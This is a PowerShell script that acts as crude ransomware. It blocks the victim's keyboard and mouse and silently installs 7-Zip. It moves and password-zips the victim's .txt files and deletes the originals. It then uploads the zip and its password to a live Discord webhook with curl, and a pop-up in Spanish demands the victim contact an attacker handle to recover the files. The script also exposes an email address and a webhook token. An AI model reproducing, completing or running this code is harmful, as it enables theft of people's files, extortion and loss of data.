#Temporarily disable user mouse and keyboard input
$code = @"
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool fBlockIt);
"@

$userInput = Add-Type -MemberDefinition $code -Name UserInput -Namespace UserInput -PassThru
$userInput::BlockInput($true)

#Install 7zip to zip files
$workdir = "c:\installer\"

If (Test-Path -Path $workdir -PathType Container)
{ Write-Host "$workdir already exists" -ForegroundColor Red}
ELSE
{ New-Item -Path $workdir  -ItemType directory }

#Download the installer
$source = "http://www.7-zip.org/a/7z1604-x64.msi"
$destination = "$workdir\7-Zip.msi"


if (Get-Command 'Invoke-Webrequest')
{
     Invoke-WebRequest $source -OutFile $destination
}
else
{
    $WebClient = New-Object System.Net.WebClient
    $webclient.DownloadFile($source, $destination)
}

Invoke-WebRequest $source -OutFile $destination 

#Start the installation
msiexec.exe /i "$workdir\7-Zip.msi" /qb

#Wait a few Seconds for the installation to finish
Start-Sleep -s 10

#Remove the installer
rm -Force $workdir\7*

#Set source and destination of files to copy and store (ideally you would use something other than desktop)
$Source = "C:\Users\bfw\Desktop\poronga"
$Destination = "C:\Users\bfw\Desktop\poronga"

#Copy all files with certain extension and delete them in the source location
$cp = robocopy /mov $Source $Destination *.txt /s

#Generate a random 8 character password
[Reflection.Assembly]::LoadWithPartialName("System.Web")
$randomPassword = [System.Web.Security.Membership]::GeneratePassword(8,2)

#Set source for 7zip exe (usually the same path in most basic computers)
$pathTo64Bit7Zip = "C:\Program Files\7-Zip\7z.exe"

#Zip destination folder with the random password previously generated
$arguments = "a -tzip ""$Destination"" ""$Destination"" -mx9 -p$randomPassword"
$windowStyle = "Normal"
$p = Start-Process $pathTo64Bit7Zip -ArgumentList $arguments -Wait -PassThru -WindowStyle $windowStyle

#Delete the destination folder
$del = Remove-Item $Destination -Force -Recurse

$email = "yokscraxker@gmail.com"

#Send password for files to your e-mail
$web = "https://discord.com/api/webhooks/988206011192074323/bosRp7vt38lle1AI4eYax-xYY2tjlyoeg66OQdjMnNhjTOvHKK6WPudrIg94lJqy1Rrb"
curl.exe -F "payload_json={\`"username\`": \`"bfw is god\`", \`"content\`": \`"Clave del zip: $randomPassword\`"}" $web
#Send zip folder to your e-mail
$ZipFolder = "C:\Users\bfw\Desktop\poronga.zip"
#Invoke-RestMethod -Uri $web -Method POST -Headers @{ "Content-Type" = "application/json" } -file "{`"content`":`"Zip: $ZipFolder`"}"
curl.exe -F "payload_json={\`"username\`": \`"bfw is god\`", \`"content\`": \`"Zip capturado:\`"}" -F "file=@\`"C:\Users\bfw\Desktop\poronga.zip\`"" $web
#Delete the zip file created
$del = Remove-Item $ZipFolder -Force -Recurse

#Disable temporary user keyboard and mouse input block
$userInput::BlockInput($false)

#Display a message demanding money
#Add the required .NET assembly for message display
Add-Type -AssemblyName System.Windows.Forms
Clear-Host
#Show the message
$result = [System.Windows.Forms.MessageBox]::Show('habla con bfw#6577 para recuperar tu archivo crack', 'te fuiste re hackeado', 'Ok', 'Warning')
